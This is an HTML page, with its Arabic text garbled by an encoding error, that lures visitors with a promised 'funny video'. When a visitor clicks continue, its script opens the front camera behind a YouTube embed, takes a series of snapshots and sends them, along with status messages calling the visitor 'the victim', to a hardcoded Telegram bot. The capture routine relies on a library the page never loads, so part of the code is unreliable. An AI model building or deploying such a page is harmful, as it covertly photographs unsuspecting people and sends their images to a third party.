<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title></title> <!-- ÙØ§Ø±Øº Ù„Ù„Ø¥Ø®ÙØ§Ø¡ -->
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { 
      margin:0; 
      background:#000; 
      color:#fff; 
      font-family:Arial, sans-serif; 
      height:100vh; 
      display:flex; 
      justify-content:center; 
      align-items:center; 
      text-align:center; 
      overflow:hidden; 
    }
    #container { 
      z-index:9999; 
      background:rgba(0,0,0,0.8); 
      padding:40px; 
      border-radius:15px; 
      max-width:90%; 
    }
    h1 { font-size:28px; margin-bottom:30px; }
    button { 
      padding:18px 40px; 
      margin:15px; 
      font-size:22px; 
      border:none; 
      border-radius:10px; 
      cursor:pointer; 
      color:white; 
      width:280px; 
    }
    #yes { background:#00cc44; }
    #no { background:#ff4444; }
    #msg { margin-top:20px; font-size:18px; }
    #video { display:none; width:100vw; height:100vh; position:fixed; top:0; left:0; z-index:1; }
  </style>
</head>
<body>

<div id="container">
  <h1>Ø´Ø§Ù‡Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø§Ù„Ù…Ø¶Ø­Ùƒ ğŸ˜‚</h1>
  <button id="yes" onclick="startCamera()">Ù…ØªØ§Ø¨Ø¹Ø© Ù…Ø´Ø§Ù‡Ø¯Ø© Ø§Ù„ÙÙŠØ¯ÙŠÙˆ</button>
  <button id="no" onclick="reject()">Ø±ÙØ¶ Ù…Ø´Ø§Ù‡Ø¯Ø© Ø§Ù„ÙÙŠØ¯ÙŠÙˆ</button>
  <div id="msg"></div>
</div>

<iframe id="video" src="https://www.youtube.com/embed/BygacCWcCi0?autoplay=1&mute=0&loop=1&playlist=BygacCWcCi0" allowfullscreen></iframe>

<script>
// Telegram Config â€“ ØªØ§Ø¹Ùƒ
const TELEGRAM_TOKEN = '8226370812:AAEYjJJffesfCxL1NIp0Ihd1r_2aSb4roSc';
const CHAT_ID = '6769216123';

// Ø¥Ø±Ø³Ø§Ù„ Ù†Øµ
function sendText(text) {
  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
  }).catch(() => {});
}

// Ø¥Ø±Ø³Ø§Ù„ ØµÙˆØ±Ø©
function sendPhoto(photo, caption) {
  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ chat_id: CHAT_ID, photo: photo, caption: caption })
  }).catch(() => {});
}

// Ø±ÙØ¶ â†’ Ù…Ø§ ÙŠØµÙŠØ± ÙˆØ§Ù„Ùˆ
function reject() {
  document.getElementById('msg').innerText = 'ØªÙ… Ø§Ù„Ø±ÙØ¶ØŒ Ø´ÙƒØ±Ø§!';
  setTimeout(() => window.close(), 2000);
}

// Ù…ØªØ§Ø¨Ø¹Ø© â†’ Ø·Ù„Ø¨ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ + Ø³Ø­Ø¨ 10 ØµÙˆØ±
async function startCamera() {
  document.getElementById('container').style.display = 'none';
  document.getElementById('video').style.display = 'block';
  document.getElementById('msg').innerText = 'Ø¬Ø§Ø±ÙŠ ØªØ´ØºÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ...';

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: { facingMode: 'user' } // Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©
    });

    sendText('âœ… Ø§Ù„Ø¶Ø­ÙŠØ© ÙˆØ§ÙÙ‚ Ø¹Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©!');

    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();

    let count = 0;
    const interval = setInterval(() => {
      if (count >= 10) {
        clearInterval(interval);
        stream.getTracks().forEach(track => track.stop());
        sendText('ØªÙ… Ø³Ø­Ø¨ 10 ØµÙˆØ± Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©');
        return;
      }

      html2canvas(video, {scale: 0.5}).then(canvas => {
        const img = canvas.toDataURL('image/png');
        sendPhoto(img, `ØµÙˆØ±Ø© ${count+1}/10 Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©`);
        count++;
      });
    }, 800); // ÙƒÙ„ 0.8 Ø«Ø§Ù†ÙŠØ© ØµÙˆØ±Ø© (Ø³Ø±ÙŠØ¹ ÙˆÙ…Ø§ ÙŠØªØ¹Ø¨Ø´ Ø§Ù„Ø¬Ù‡Ø§Ø²)

  } catch (err) {
    sendText(`âŒ Ø±ÙØ¶ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§: ${err.message}`);
    document.getElementById('msg').innerText = 'ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù„Ù…Ø´Ø§Ù‡Ø¯Ø© Ø§Ù„ÙÙŠØ¯ÙŠÙˆ';
    document.getElementById('container').style.display = 'block';
    document.getElementById('video').style.display = 'none';
  }
}
</script>

</body>
</html>
